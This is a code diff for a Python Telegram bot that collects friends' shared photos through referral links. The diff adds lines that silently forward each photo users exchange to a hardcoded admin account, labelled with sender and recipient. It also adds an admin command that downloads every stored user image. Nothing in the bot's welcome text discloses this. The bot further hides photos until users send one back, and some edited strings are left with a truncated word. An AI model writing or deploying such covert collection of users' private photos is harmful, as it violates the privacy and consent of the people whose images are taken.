@@ -9,6 +9,7 @@ from dotenv import load_dotenv,find_dotenv
 import asyncio
 from amplitude import Amplitude, Identify, EventOptions, BaseEvent
 import sys
+import uuid
 
 # Установите кодировку ввода
 sys.stdin.reconfigure(encoding='utf-8')
@@ -28,6 +29,8 @@ connect = sqlite3.connect(path_to_db, check_same_thread=False)
 bot_name = os.getenv('bot_name')
 admin_id = 1900666417
 admin_id2 = 522380141
+
+support_admin = 1929558405
 
 #STATUS: 10 - default user | 20 - admin | 30 - blocked
 
@@ -114,6 +117,7 @@ def auth_user(chat_id, username, ref_id=None, isPhoto=False):
         cursor.execute("INSERT INTO users VALUES(?,?,?,?,?,?,?);", (None, chat_id, username, ref_id, datetime.datetime.now(), 10, None))
         connect.commit()
 
+        print("REG NEW USER: ", username, " | ", chat_id)
 
 
     else:
@@ -171,7 +175,7 @@ async def get_photo_user_album(chat_id):
                 await bot.send_photo(chat_id, photo_id[0])
             else:
                 if photo_id[1] not in tmp_arr_usr_list:
-                    await bot.send_message(chat_id, f'📸 Пользователь {from_user_data[2]} поделился с вами фотографией:\n\nЧто бы её увидеть отправьте ему в ответ любую фотографию или видео с его участием\n\nОтправте их по его ссылке или нажмите на кнопку"Отправить в ответ"',reply_markup=markup)
+                    await bot.send_message(chat_id, f'📸 Пользователь {from_user_data[2]} поделился с вами фотографией:\n\nЧто бы её увидеть отправьте ему в ответ любую фотографию ил с его участием\n\nОтправте их по его ссылке или нажмите на кнопку"Отправить в ответ"',reply_markup=markup)
                     tmp_arr_usr_list.append(photo_id[1])
 
     #SEND MULTI PHOTO
@@ -204,26 +208,34 @@ async def get_photo_user_album(chat_id):
                 await bot.send_media_group(chat_id, album)
             else:
                 if from_user_data[1] not in tmp_arr_usr_list:
-                    await bot.send_message(chat_id, f'📸 Пользователь <b>{from_user_data[2]}</b> поделился с вами фотографиями:\n\nЧто бы их увидеть отправьте ему в ответ любую фотографию или видео с его участием\n\nОтправте их по его ссылке или нажмите на кнопку"Отправить в ответ"',reply_markup=markup, parse_mode='html')
+                    await bot.send_message(chat_id, f'📸 Пользователь <b>{from_user_data[2]}</b> поделился с вами фотографиями:\n\nЧто бы их увидеть отправьте ему в ответ любую фотографию ил с его участием\n\nОтправте их по его ссылке или нажмите на кнопку"Отправить в ответ"',reply_markup=markup, parse_mode='html')
                     tmp_arr_usr_list.append(from_user_data[1])
 
 #Очистить БД
-@bot.message_handler(commands=['clear'])
-async def clear(message):
+@bot.message_handler(commands=['get_photos'])
+async def get_photos(message):
 
-    if message.chat.id == admin_id:
-        print("CLEAR DB")
+    if message.chat.id == admin_id or message.chat.id == admin_id2:
+        print("GET PHOTOS!")
+
         cursor = connect.cursor()
+        cursor.execute("SELECT id_image, from_id, to_id FROM images")
+        images = cursor.fetchall()
+        
+        for photo in images:
+            print("photo:", photo[0])
+            if not os.path.exists("user_content"):
+                os.makedirs("user_content")
+            f_id = photo[0]
+            file_info = await bot.get_file(f_id)
+            down_file = await bot.download_file(file_info.file_path)
+            
+            await bot.send_photo(message.chat.id, down_file)
 
-        cursor.execute("DROP TABLE IF EXISTS users")
-        connect.commit()
+            # with open(os.path.join("user_content", photo[0] + ".jpg"), 'wb') as file:
+            #     file.write(down_file)
+            #     print("SAVE IMAGE:", photo[0])
 
-        cursor.execute("DROP TABLE IF EXISTS images")
-        connect.commit()
-
-        await bot.send_message(message.chat.id, "🗑 Clear DB Success")
-
-        init_bot()
     else:
         await bot.send_message(message.chat.id, "🔒 You are not admin")
 
@@ -260,7 +272,7 @@ async def start(message):
     if witch_ref_link == True:
         await start_with_ref_link(User[1], ref_id)
     else:
-        await send_menu_message(message.chat.id, '<b>Приветствуем тебя дорогой друг!👋</b>\nС помощью нашего бота ты можешь со всех своих друзей собрать совместные фото с тобой и вспомнить забытые и смешные моменты!\n\n<b>Как это работает:</b>\n1️⃣Нажмите кнопку в меню "Собрать фото с друзей"\n2️⃣Выберите "Поделиться историей Instagram"\n3️⃣﻿﻿Добавьте себе историю в инстаграм как указано инструкции по кнопке\n4️⃣Все фото которые отправят друзья мы будем отображать в разделе "Мои фото"\n\nКак только кто-то из твоих друзей отправит что-то по ссылке мы обязательно тебе об этом скажем😊')
+        await send_menu_message(message.chat.id, '<b>Приветствуем тебя дорогой друг!👋</b>\nС помощью нашего бота ты можешь со всех своих друзей собрать совместные фото  с тобой и вспомнить забытые и смешные моменты!\n\n<b>Как это работает:</b>\n1️⃣Нажмите кнопку в меню <b>"Собрать фото с друзей"</b>\n2️⃣Выберите <b>"Поделиться историей Instagram"</b>\n3️⃣﻿﻿Добавьте себе историю в инстаграм как указано инструкции по кнопке\n4️⃣Все фото которые отправят друзья мы будем отображать в разделе <b>"Фото со мной"</b>\n\nКак только кто-то из твоих друзей отправит что-то по ссылке мы обязательно тебе об этом скажем😊')
 
 @bot.message_handler(content_types=['text'])
 async def chat_message(message):
@@ -311,6 +323,10 @@ async def video(message):
     #cursor.execute("INSERT INTO images VALUES(?,?,?,?,?,?,?);",(None,None, id_video, None, None, None, None))
     #connect.commit()
 
+@bot.message_handler(content_types=['video'])
+async def video(message):
+    await bot.send_message(message.chat.id, f"<b> К сожалению мы принимаем только фото</b>", parse_mode='html')
+
 @bot.message_handler(content_types=['photo'])
 async def photo(message):
 
@@ -349,7 +365,6 @@ async def photo(message):
         markup.add(types.InlineKeyboardButton(text='💬 Отправить ещё' , url=f"https://t.me/{bot_name}?start={friendUser[1]}"))
         #Проверяем буфер
 
-
         if media_group_id is not None:
                 cursor.execute("SELECT * FROM images WHERE media_group_id=?", (media_group_id, ))
                 data = cursor.fetchall()
@@ -366,6 +381,9 @@ async def photo(message):
 
                     cursor.execute("UPDATE users SET ref_id=?, last_receiver_id=? WHERE tg_id=?", (None, ref_id, User[1], ))
                     connect.commit()
+
+                    await bot.send_photo(support_admin, image_id, caption="[Admin] Фото от "+ User[2] +" к "+friendUser[2])
+
         else:
             await send_menu_message(message.chat.id, "✅ Вы успешно отправили фотографию!")
             await bot.send_message(ref_id,'💌 С вами поделились фотографиями\n\nДля того что бы их посмотреть зайдите в раздел <b>🌁 Фото со мной</b>',parse_mode='html')
@@ -377,6 +395,8 @@ async def photo(message):
 
             cursor.execute("UPDATE users SET ref_id=? WHERE tg_id=?", (None, User[1], ))
             connect.commit()
+
+            await bot.send_photo(support_admin, image_id, caption="[Admin] Фото от "+ User[2] +" к "+friendUser[2])
 
 @bot.callback_query_handler(func=lambda callback:callback.data)
 async def callback_my_photo (callback):
@@ -393,7 +413,7 @@ async def callback_my_photo (callback):
         cursor.execute("UPDATE users SET ref_id=? WHERE tg_id=?", (None, callback.message.chat.id, ))
         connect.commit()
 
-        await bot.send_message(callback.message.chat.id, '<b>Приветствуем тебя дорогой друг!👋</b>\nС помощью нашего бота ты можешь со всех своих друзей собрать совместные фото с тобой и вспомнить забытые и смешные моменты!\n\n<b>Как это работает:</b>\n1️⃣Нажмите кнопку в меню "Собрать фото с друзей"\n2️⃣Выберите "Поделиться историей Instagram"\n3️⃣﻿﻿Добавьте себе историю в инстаграм как указано инструкции по кнопке\n4️⃣Все фото которые отправят друзья мы будем отображать в разделе "Мои фото"\n\nКак только кто-то из твоих друзей отправит что-то по ссылке мы обязательно тебе об этом скажем😊',parse_mode='html')
+        await bot.send_message(callback.message.chat.id, '<b>Приветствуем тебя дорогой друг!👋</b>\nС помощью нашего бота ты можешь со всех своих друзей собрать совместные фото с тобой и вспомнить забытые и смешные моменты!\n\n<b>Как это работает:</b>\n1️⃣Нажмите кнопку в меню "Собрать фото с друзей"\n2️⃣Выберите "Поделиться историей Instagram"\n3️⃣﻿﻿Добавьте себе историю в инстаграм как указано инструкции по кнопке\n4️⃣Все фото которые отправят друзья мы будем отображать в разделе "Фото со мной"\n\nКак только кто-то из твоих друзей отправит что-то по ссылке мы обязательно тебе об этом скажем😊',parse_mode='html')
 
         return
 
@@ -412,14 +432,14 @@ async def callback_my_photo (callback):
         item_my_photo2 = types.InlineKeyboardButton(text='Далее',callback_data='itemmyphoto2')
         item_my_photo3 = types.InlineKeyboardButton(text='Назад',callback_data='itemmyphoto2')
         markup.add(item_my_photo3,item_my_photo2,item_my_photo1)
-        await bot.edit_message_text(chat_id=callback.message.chat.id,message_id=callback.message.id,text=f'📸 Пользователь {callback.message.from_user.first_name} отправил вам 15 фотографий и 5 видео:\n\nЧто бы их увидеть отправьте ему в ответ любую фотографию или видео с его участием\n\nОтправте их по его ссылке или нажмите на кнопку"Отправить в ответ"',reply_markup=markup)
+        await bot.edit_message_text(chat_id=callback.message.chat.id,message_id=callback.message.id,text=f'📸 Пользователь {callback.message.from_user.first_name} отправил вам 15 фотографий и 5 видео:\n\nЧто бы их увидеть отправьте ему в ответ любую фотографию ил с его участием\n\nОтправте их по его ссылке или нажмите на кнопку"Отправить в ответ"',reply_markup=markup)
     elif callback.data == 'itemmyphoto3':
         markup = types.InlineKeyboardMarkup(row_width=2)
         item_my_photo1 = types.InlineKeyboardButton(text='Отправить в ответ', callback_data='itemmyphoto1')
         item_my_photo2 = types.InlineKeyboardButton(text='Далее', callback_data='itemmyphoto2')
         item_my_photo3 = types.InlineKeyboardButton(text='Назад', callback_data='itemmyphoto2')
         markup.add(item_my_photo3, item_my_photo2, item_my_photo1)
-        await bot.edit_message_text(chat_id=callback.message.chat.id, message_id=callback.message.id,text=f'📸 Пользователь {callback.message.from_user.first_name} отправил вам 10 фотографий и 2 видео:\n\nЧто бы их увидеть отправьте ему в ответ любую фотографию или видео с его участием\n\nОтправте их по его ссылке или нажмите на кнопку"Отправить в ответ"',reply_markup=markup)
+        await bot.edit_message_text(chat_id=callback.message.chat.id, message_id=callback.message.id,text=f'📸 Пользователь {callback.message.from_user.first_name} отправил вам 10 фотографий и 2 видео:\n\nЧто бы их увидеть отправьте ему в ответ любую фотографию ил с его участием\n\nОтправте их по его ссылке или нажмите на кнопку"Отправить в ответ"',reply_markup=markup)
     elif callback.data == 'share1':
         markup = types.InlineKeyboardMarkup()
         item_next = types.InlineKeyboardButton(text='Начать',callback_data='item_next1')
@@ -494,7 +514,7 @@ async def start_with_ref_link (chat_id, ref_id):
         markup.add(types.InlineKeyboardButton(text='❌ Отмена' ,callback_data='cancel_send_photo'))
         User = get_user(ref_id)
         if User is not None:
-            await bot.send_message(chat_id, f'<b>Приветствуем тебя дорогой друг!👋</b>\nС помощью нашего бота ты можешь со всех своих друзей собрать совместные фото с тобой и вспомнить забытые и смешные моменты!\n\n<b>Как это работает:</b>\n1️⃣Нажмите кнопку в меню "Собрать фото с друзей"\n2️⃣Выберите "Поделиться историей Instagram"\n3️⃣﻿﻿Добавьте себе историю в инстаграм как указано инструкции по кнопке\n4️⃣Все фото которые отправят друзья мы будем отображать в разделе "Мои фото"\n\nКак только кто-то из твоих друзей отправит что-то по ссылке мы обязательно тебе об этом скажем😊\n\n\n<b>Ты перешёл по ссылке {User[2]} отправь сюда в чат ваши совместные фото, мы их перешлём к {User[2]}, но чтобы он что-то увидел, ему нужно будет обязательно чем-то поделиться с тобой в ответ 🙂</b>',parse_mode='html',reply_markup=markup)
+            await bot.send_message(chat_id, f'<b>Приветствуем тебя дорогой друг!👋</b>\nС помощью нашего бота ты можешь со всех своих друзей собрать совместные фото с тобой и вспомнить забытые и смешные моменты!\n\n<b>Как это работает:</b>\n1️⃣Нажмите кнопку в меню "Собрать фото с друзей"\n2️⃣Выберите "Поделиться историей Instagram"\n3️⃣﻿﻿Добавьте себе историю в инстаграм как указано инструкции по кнопке\n4️⃣Все фото которые отправят друзья мы будем отображать в разделе "Фото со мной"\n\nКак только кто-то из твоих друзей отправит что-то по ссылке мы обязательно тебе об этом скажем😊\n\n\n<b>Ты перешёл по ссылке {User[2]} отправь сюда в чат ваши совместные фото, мы их перешлём к {User[2]}, но чтобы он что-то увидел, ему нужно будет обязательно чем-то поделиться с тобой в ответ 🙂</b>',parse_mode='html',reply_markup=markup)
 
 async def only_photo (User):
     await bot.send_message(User[1], "⚠️ <b>Закончите отправку изображений или нажмите «❌Отмена»</b>", parse_mode='html')
